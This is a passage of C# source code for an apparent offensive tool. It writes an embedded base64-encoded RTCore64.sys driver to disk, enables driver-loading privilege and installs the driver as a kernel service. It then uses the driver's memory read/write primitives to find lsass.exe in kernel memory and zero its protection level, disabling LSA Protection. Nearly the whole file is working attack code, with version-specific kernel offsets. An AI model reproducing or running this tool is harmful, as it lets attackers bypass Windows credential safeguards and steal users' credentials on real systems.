ccr6+YMgb3RFRcKZeuF2IDL6LTf0eAz+g7+pmde8vYY9xKUf85l4Fg4uGRSCrm1/COj/ozfJbYwtON30dqSXJlqJDBu/De6JsavTI0OImjdXcy0gW6BlJfqPbhUAVAWlPlXO9xrAtq86ZA5Miu9elQq4qLXIvN2yrelq2Uc6PYYK4W/b4zYsq/2RbaCJFn2QbTeNv0U09/+3fYe6uin49bu9m0t8EnrBcKJw3HpyctOP3zu62/tEjUfl3U0xCliGZqDWZ2Lhs3BLHgDjlzkZDAL0uYHPLSe6B9JHLsMg7fKeJj8mJ4mV0WIQKWjJmbMwggV/MIIDZ6ADAgECAgphC39rAAAAAAAZMA0GCSqGSIb3DQEBBQUAMH8xCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKTAnBgNVBAMTIE1pY3Jvc29mdCBDb2RlIFZlcmlmaWNhdGlvbiBSb290MB4XDTA2MDUyMzE3MDA1MVoXDTE2MDUyMzE3MTA1MVowVzELMAkGA1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExEDAOBgNVBAsTB1Jvb3QgQ0ExGzAZBgNVBAMTEkdsb2JhbFNpZ24gUm9vdCBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANoO5pmNzqPjT4p++/GLgyVr6kgf8SqwuZURBL3wY9HiZ2bPHN3PG0gr7o2JjpqvKYBlq+nHLRLLqxxMcAehPQowzRWNT/jd1IxQFRzvUO7ELvf86VLykX3gbdU1MI5eQ3PyQenVauOyiTpWOThvBjyIaVsqTcWnVLhsicyb+TzK5f2J9RI8kniW1tx0bpNEYdGNx0aydQ6G6BmK1W1s1XgWlaLpyAo46/IkE09zVJMThTobvB40tYsFjLl3i7HbHyCRqwlTbpDOezd0uXBHkSJRYxZ5rrGuQSYIyBkr0UaqSNZkKteDNP8sKsFsGUNKB4Xn03z2IWjv6vJSn3+TkM8CAwEAAaOCASMwggEfMBEGA1UdIAQKMAgwBgYEVR0gADA2BgkrBgEEAYI3FQcEKTAnBh8rBgEEAYI3FQiN4NGJToTXnMMHhqaG+xyP07+mFQEZAgFuAgEAMAsGA1UdDwQEAwIBhjAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBRge2YaRQ2XyolQL30EzTSo//z9SzAdBgkrBgEEAYI3FAIEEB4OAEMAcgBvAHMAcwBDAEEwHwYDVR0jBBgwFoAUYvsKIVt/Q24R2glUUGv10pZx8Z4wVQYDVR0fBE4wTDBKoEigRoZEaHR0cDovL2NybC5taWNyb3NvZnQuY29tL3BraS9jcmwvcHJvZHVjdHMvTWljcm9zb2Z0Q29kZVZlcmlmUm9vdC5jcmwwDQYJKoZIhvcNAQEFBQADggIBABPFbF4HfzxX/5sxXz+9lVQlxnn5LDEDTWRpS1bZW5dvfPPw0CRldThjmBNwFhP3pwHxxiPghYZsC/CAlFp16HzkHpK0c7/Bs6ewC9MYhMvMCaNcnE8+sDqcLRvEBO+XN5Zv5ey6rGqz1OI834sl56y8YkUx3aQKcuQb+HhDAcy6ORTeXZCu2FrPXspGgVEz1aYOWGfT2GZYiBab7rEayq2RE4Qh2ppuIO/aAHQouslf801dw9olaSVU6kS8w5spMxzWPJYfh4HFU9cqJzPULhl8CFht204ZmanqX/OanYxROlpcvS+pCDWbVKfbNRpSFjM0OqOABGr9tIOMrZDPDDplluwzThgmuEm764GS/xNNMksjxzPntnFrFfacgOa8t2y+QdUDOnEzFQBQdDsOXfmWqu2QPqsTTICZJrw4pesCNokdtiC+g6sQ+Bme12N51K6xL2E2+UpLqDPHDnJB+fGxkH6uRu/eOXt1oEEUWQQdQrxHiLgTDgX6HfCAjf9wxnfYS9xGDiMactW/3v6qrmlYPPxcRuTVgZqLbmVZdxoypZCmtmSTZP0HU8mg3iitKmzGONGBzpj1QBnpLBdDpCZf00QwU+QdArqkCi8W3XpgJ1JCu62YNyiX5LjSeRHjEIxI1TBdCgxS3vWI6o0aLWfJ9IAUhLeFDNFmKKXGbyRhMYIEpjCCBKICAQEwZzBRMQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFsU2lnbiBudi1zYTEnMCUGA1UEAxMeR2xvYmFsU2lnbiBDb2RlU2lnbmluZyBDQSAtIEcyAhIRIVgESGPk3BnPKahWaLf0WEIwCQYFKw4DAhoFAKBwMBAGCisGAQQBgjcCAQwxAjAAMBkGCSqGSIb3DQEJAzEMBgorBgEEAYI3AgEEMBwGCisGAQQBgjcCAQsxDjAMBgorBgEEAYI3AgEVMCMGCSqGSIb3DQEJBDEWBBSkxyZBSkt/dEgvm7NgVeAg4e086jANBgkqhkiG9w0BAQEFAASCAQBEGLUH37dos8K1RfPaSNCoJFTyg3zoh5uMVG/oBNzJgh0TUs1f+kiRNkKl7T2bAzXiCH4M0ju1SpL4AyS7Em3qVutG9pGDp9oaG410ddMSUuQs2xAaQ0ozglVFZrkqsGOpPNWgkfmaokgMeLKUOvSHJOG5j7yqfGUsheveqa3bmiX+gfcI3vu7dJ+VztekpIrVunVxVwg9mh6NSMxG+/d8zwmcs7o3XCHDMSfHTNdrSqJ9oo02i3oMXofUaX7gWjswshzi+os40vCqvwD6N/6ZJL1Fw2vUCqtt2EXR8v+ijU+/N5EIfoGV0beEZfXW3TUNv+Xc7vpQl50fP9sR87IDoYICojCCAp4GCSqGSIb3DQEJBjGCAo8wggKLAgEBMGgwUjELMAkGA1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExKDAmBgNVBAMTH0dsb2JhbFNpZ24gVGltZXN0YW1waW5nIENBIC0gRzICEhEh1pmnZJc+8fhCfukZzFNBFDAJBgUrDgMCGgUAoIH9MBgGCSqGSIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcNAQkFMQ8XDTE3MDgyNzE0NDQ0MFowIwYJKoZIhvcNAQkEMRYEFNE9JNTH8u8RXuyb/hXB57ol162jMIGdBgsqhkiG9w0BCRACDDGBjTCBijCBhzCBhAQUY7gvq2H1g5CWlQULACScUCkz7HkwbDBWpFQwUjELMAkGA1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExKDAmBgNVBAMTH0dsb2JhbFNpZ24gVGltZXN0YW1waW5nIENBIC0gRzICEhEh1pmnZJc+8fhCfukZzFNBFDANBgkqhkiG9w0BAQEFAASCAQBeW24nAB9J4I/fQKUvKlmW2iO7MuyLiuLieNFga0MKQQ9ENBaxgS5vn3KXEURQ8tsXhThUTWAvuCiw4cPgYjUcfqpZJ3zOBME7ErDL7RFxzwxxS2hJBnH+CmJy6ut1PbbSQUPa5z2mfkzBUSCSc0A5HmOXHXoiTRe6G3SlMmhMUw4DbWcrq6fU2IDRwKOv4DvSMHh0J4r6pOZfE2R52VfmDbPTy1K65Nt3iEPUbh9LTN6qIL4Mbs3eNY1n+CwvUX66yLbsnrZrqQgTD7/JSJDxEqXrdf6sN4fDmJkOJlqR5f4s/F1oVT+W7DmzBHnQO7+gF+PNnnPKxHIHYtZT8rlLAAAAAAA="; 
        private static string DriverPath = @"C:\Users\Public\Documents\RTCore64.sys";

        [StructLayout(LayoutKind.Sequential)]
        public struct SERVICE_STATUS
        {
            public uint dwServiceType;
            public uint dwCurrentState;
            public uint dwControlsAccepted;
            public uint dwWin32ExitCode;
            public uint dwServiceSpecificExitCode;
            public uint dwCheckPoint;
            public uint dwWaitHint;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            ref RTCORE64_MEMORY_READ InBuffer,
            uint nInBufferSize,
            ref RTCORE64_MEMORY_READ OutBuffer,
            uint nOutBufferSize,
            out uint lpBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            ref RTCORE64_MEMORY_WRITE InBuffer,
            uint nInBufferSize,
            ref RTCORE64_MEMORY_WRITE OutBuffer,
            uint nOutBufferSize,
            out uint lpBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(
            IntPtr TokenHandle,
            bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            uint BufferLength,
            IntPtr PreviousState,
            IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr OpenSCManager(
            string lpMachineName,
            string lpDatabaseName,
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateService(
            IntPtr hSCManager,
            string lpServiceName,
            string lpDisplayName,
            uint dwDesiredAccess,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ControlService(
            IntPtr hService,
            uint dwControl,
            out SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        public const string SE_LOAD_DRIVER_NAME = "SeLoadDriverPrivilege";

        public static bool SetPrivilege(IntPtr tokenHandle, string privilege, bool enablePrivilege)
        {
            LUID luid = new LUID();
            if (!LookupPrivilegeValue(null, privilege, ref luid))
            {
                Console.WriteLine("[-] LookupPrivilegeValue failed.");
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = new LUID_AND_ATTRIBUTES
                {
                    Luid = luid,
                    Attributes = enablePrivilege ? 2u : 0u // SE_PRIVILEGE_ENABLED
                }
            };

            return AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        }

        public static void EnableDriverLoadingPrivilege()
        {
            IntPtr tokenHandle;
            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020 | 0x0008, out tokenHandle))
            {
                Console.WriteLine("[-] Failed to open process token.");
                return;
            }

            try
            {
                if (SetPrivilege(tokenHandle, SE_LOAD_DRIVER_NAME, true))
                {
                    Console.WriteLine("[+] SeLoadDriverPrivilege enabled.");
                }
                else
                {
                    Console.WriteLine("[-] Failed to enable SeLoadDriverPrivilege.");
                }
            }
            finally
            {
                CloseHandle(tokenHandle);
            }
        }

        public static void InstallDriver()
        {
            if (!File.Exists(DriverPath))
            {
                Console.WriteLine("[-] Driver file not found: " + DriverPath);
                return;
            }

            IntPtr scManager = OpenSCManager(null, null, 0x0002); // SC_MANAGER_CREATE_SERVICE
            if (scManager == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open Service Control Manager.");
                return;
            }

            try
            {
                IntPtr service = CreateService(
                    scManager,
                    "RTCore64",
                    "RTCore64 Driver",
                    0xF01FF, // SERVICE_ALL_ACCESS
                    0x00000001, // SERVICE_KERNEL_DRIVER
                    0x00000003, // SERVICE_DEMAND_START
                    0x00000001, // SERVICE_ERROR_NORMAL
                    DriverPath,
                    null,
                    IntPtr.Zero,
                    null,
                    null,
                    null);

                if (service == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to create service.");
                    return;
                }

                try
                {
                    if (StartService(service, 0, null))
                    {
                        Console.WriteLine("[+] Driver installed and started successfully.");
                    }
                    else
                    {
                        Console.WriteLine("[-] Failed to start driver.");
                    }
                }
                finally
                {
                    CloseServiceHandle(service);
                }
            }
            finally
            {
                CloseServiceHandle(scManager);
            }
        }

        public static void UninstallDriver()
        {
            IntPtr scManager = OpenSCManager(null, null, 0x0001 /* SC_MANAGER_CONNECT */);
            if (scManager == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open Service Control Manager.");
                return;
            }

            try
            {
                IntPtr hService = OpenService(scManager, "RTCore64", 0x0020 /* SERVICE_STOP */);
                if (hService != IntPtr.Zero)
                {
                    SERVICE_STATUS status;
                    if (ControlService(hService, 0x00000001, out status))
                    {
                        Console.WriteLine("[+] Service stopped successfully.");
                    }
                    else
                    {
                        int err = Marshal.GetLastWin32Error();
                        if (err == 1062) // ERROR_SERVICE_NOT_ACTIVE
                            Console.WriteLine("[*] Service not running.");
                        else
                            Console.WriteLine("[-] Failed to stop service (Error: " + err + ")");
                    }
                    CloseServiceHandle(hService);
                }

                IntPtr hServiceDelete = OpenService(scManager, "RTCore64", 0x10000 /* DELETE */);
                if (hServiceDelete != IntPtr.Zero)
                {
                    if (DeleteService(hServiceDelete))
                    {
                        Console.WriteLine("[+] Service deleted successfully.");
                    }
                    else
                    {
                        Console.WriteLine("[-] Failed to delete service.");
                    }
                    CloseServiceHandle(hServiceDelete);
                }
                else
                {
                    int err = Marshal.GetLastWin32Error();
                    if (err == 1060) // ERROR_SERVICE_DOES_NOT_EXIST
                        Console.WriteLine("[*] Service not present.");
                }

                if (File.Exists(DriverPath))
                {
                    File.Delete(DriverPath);
                    Console.WriteLine("[+] Deleted " + DriverPath);
                }
            }
            finally
            {
                CloseServiceHandle(scManager);
            }
        }

        public static uint ReadMemoryPrimitive(IntPtr device, uint size, ulong address)
        {
            var memoryRead = new RTCORE64_MEMORY_READ
            {
                Pad0 = new byte[8],
                Address = address,
                Pad1 = new byte[8],
                ReadSize = size,
                Pad3 = new byte[16]
            };

            uint bytesReturned;
            if (!DeviceIoControl(
                device,
                RTCORE64_MEMORY_READ_CODE,
                ref memoryRead,
                (uint)Marshal.SizeOf(typeof(RTCORE64_MEMORY_READ)),
                ref memoryRead,
                (uint)Marshal.SizeOf(typeof(RTCORE64_MEMORY_READ)),
                out bytesReturned,
                IntPtr.Zero))
            {
                throw new InvalidOperationException("[-] DeviceIoControl failed for ReadMemoryPrimitive");
            }

            return memoryRead.Value;
        }

        public static void WriteMemoryPrimitive(IntPtr device, uint size, ulong address, uint value)
        {
            var memoryWrite = new RTCORE64_MEMORY_WRITE
            {
                Pad0 = new byte[8],
                Address = address,
                Pad1 = new byte[8],
                ReadSize = size,
                Value = value,
                Pad3 = new byte[16]
            };

            uint bytesReturned;
            if (!DeviceIoControl(
                device,
                RTCORE64_MEMORY_WRITE_CODE,
                ref memoryWrite,
                (uint)Marshal.SizeOf(typeof(RTCORE64_MEMORY_WRITE)),
                ref memoryWrite,
                (uint)Marshal.SizeOf(typeof(RTCORE64_MEMORY_WRITE)),
                out bytesReturned,
                IntPtr.Zero))
            {
                throw new InvalidOperationException("[-] DeviceIoControl failed for WriteMemoryPrimitive");
            }
        }

        public static void Main(string[] args)
        {
            
			Console.WriteLine("[+] Writing RTCore64.sys driver to disk");
			
			byte[] driverBytes = Convert.FromBase64String(Base64Driver);
            File.WriteAllBytes(DriverPath, driverBytes);
            Console.WriteLine("[+] Driver written to " + DriverPath);
			
			EnableDriverLoadingPrivilege();
			
			InstallDriver();
			
			IntPtr device = CreateFile("\\\\.\\RTCore64", 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
            if (device == IntPtr.Zero || device == new IntPtr(-1))
            {
                Console.WriteLine("[-] Failed to open device. Ensure the driver is installed and the device path is correct.");
            }
            else
            {
                try
                {
                    var offsets = LsaProtection.GetVersionOffsets();
                    LsaProtection.DisableLsaProtection(device, offsets);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Error: " + ex.Message);
                }
                finally
                {
                    CloseHandle(device);
                }
            }
			
			UninstallDriver();
        }

        public class LsaProtection
        {
            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct Offsets
            {
                public ulong UniqueProcessIdOffset;
                public ulong ActiveProcessLinksOffset;
                public ulong TokenOffset;
                public ulong SignatureLevelOffset;
            }

            [DllImport("psapi.dll", SetLastError = true)]
            public static extern bool EnumDeviceDrivers(IntPtr[] lpImageBase, uint cb, out uint lpcbNeeded);

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            public static extern IntPtr LoadLibrary(string lpLibFileName);

            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            public static Offsets GetVersionOffsets()
            {
                string releaseId = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "").ToString();
                Console.WriteLine("[+] Windows Version " + releaseId + " Found");

                int winVer = int.Parse(releaseId);
                switch (winVer)
                {
                    case 1607:
                        return new Offsets { UniqueProcessIdOffset = 0x02e8, ActiveProcessLinksOffset = 0x02f0, TokenOffset = 0x0358, SignatureLevelOffset = 0x06c8 };
                    case 1803:
                    case 1809:
                        return new Offsets { UniqueProcessIdOffset = 0x02e0, ActiveProcessLinksOffset = 0x02e8, TokenOffset = 0x0358, SignatureLevelOffset = 0x06c8 };
                    case 1903:
                    case 1909:
                        return new Offsets { UniqueProcessIdOffset = 0x02e8, ActiveProcessLinksOffset = 0x02f0, TokenOffset = 0x0360, SignatureLevelOffset = 0x06f8 };
                    case 2004:
                    case 2009:
                        return new Offsets { UniqueProcessIdOffset = 0x0440, ActiveProcessLinksOffset = 0x0448, TokenOffset = 0x04b8, SignatureLevelOffset = 0x0878 };
                    default:
                        throw new InvalidOperationException("Version Offsets Not Found!");
                }
            }

            public static int ProcessPIDByName(string name)
            {
                string baseName = Path.GetFileNameWithoutExtension(name);
                foreach (var p in Process.GetProcessesByName(baseName))
                {
                    return p.Id;
                }
                throw new InvalidOperationException("[-] Process not found: " + name);
            }

            public static ulong GetKernelBaseAddr()
            {
                uint needed = 0;
                EnumDeviceDrivers(null, 0, out needed);
                int count = (int)(needed / (uint)IntPtr.Size);
                IntPtr[] drivers = new IntPtr[count];

                if (!EnumDeviceDrivers(drivers, needed, out needed))
                    throw new InvalidOperationException("[-] EnumDeviceDrivers failed.");

                return (ulong)drivers[0].ToInt64();
            }

            public static ulong ReadMemoryDWORD64(IntPtr device, ulong address)
            {
                uint low = Program.ReadMemoryPrimitive(device, 4, address);
                uint high = Program.ReadMemoryPrimitive(device, 4, address + 4);
                return ((ulong)high << 32) | low;
            }

            public static ulong GetPsInitialSystemProcessAddress(IntPtr device, ulong kernelBase)
            {
                IntPtr hNtoskrnl = LoadLibrary("ntoskrnl.exe");
                if (hNtoskrnl == IntPtr.Zero)
                    throw new InvalidOperationException("[-] Failed to load ntoskrnl.exe");

                IntPtr pPsInitialSystemProcess = GetProcAddress(hNtoskrnl, "PsInitialSystemProcess");
                if (pPsInitialSystemProcess == IntPtr.Zero)
                    throw new InvalidOperationException("GetProcAddress for PsInitialSystemProcess failed.");

                ulong offset = (ulong)pPsInitialSystemProcess.ToInt64() - (ulong)hNtoskrnl.ToInt64();
                ulong PsInitialSystemProcessAddress = ReadMemoryDWORD64(device, kernelBase + offset);
                return PsInitialSystemProcessAddress;
            }

            public static void DisableProtectedProcesses(IntPtr device, Offsets offsets, int targetPID)
            {
                ulong kernelBase = GetKernelBaseAddr();
                Console.WriteLine("[*] Kernel base: 0x{0:X}", kernelBase);

                ulong PsInitialSystemProcessAddress = GetPsInitialSystemProcessAddress(device, kernelBase);
                Console.WriteLine("[*] PsInitialSystemProcess: 0x{0:X}", PsInitialSystemProcessAddress);

                ulong ProcessHead = PsInitialSystemProcessAddress + offsets.ActiveProcessLinksOffset;
                ulong CurrentProcessAddress = ProcessHead;
                ulong TargetProcessId = (ulong)targetPID;

                do
                {
                    ulong ProcessAddress = CurrentProcessAddress - offsets.ActiveProcessLinksOffset;
                    ulong UniqueProcessId = ReadMemoryDWORD64(device, ProcessAddress + offsets.UniqueProcessIdOffset);

                    if (UniqueProcessId == TargetProcessId)
                    {
                        Console.WriteLine("[*] Found target EPROCESS: 0x{0:X}", ProcessAddress);

                        Program.WriteMemoryPrimitive(device, 4, ProcessAddress + offsets.SignatureLevelOffset, 0);
                        Console.WriteLine("[+] SignatureLevel set to 0, protection disabled.");
                        return;
                    }

                    CurrentProcessAddress = ReadMemoryDWORD64(device, ProcessAddress + offsets.ActiveProcessLinksOffset);
                } while (CurrentProcessAddress != ProcessHead);

                Console.WriteLine("[-] Failed to find target process in kernel list.");
            }

            public static void DisableLsaProtection(IntPtr device, Offsets offsets)
            {
                Console.WriteLine("[+] Disabling LSA Protection...");

                int lsassPID = ProcessPIDByName("lsass.exe");
                DisableProtectedProcesses(device, offsets, lsassPID);
                Console.WriteLine("[+] LSA Protection disabled.");
            }
        }
    }
}
